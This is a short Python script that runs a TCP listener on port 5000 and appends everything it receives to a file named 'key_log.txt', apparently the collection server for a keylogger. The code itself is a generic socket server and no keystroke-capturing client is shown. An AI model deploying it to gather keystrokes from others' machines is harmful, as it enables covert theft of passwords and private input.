import socket

log_file_path = "key_log.txt"

def server_program():
    host = '0.0.0.0'
    port = 5000

    server_socket = socket.socket()
    server_socket.bind((host, port))

    server_socket.listen(2)
    conn, address = server_socket.accept()
    print("Connection from: " + str(address))

    while True:
        data = conn.recv(1024).decode()
        if not data:
            break
        with open(log_file_path, "a") as log_file:
            log_file.write(str(data))


if __name__ == '__main__':
    server_program()
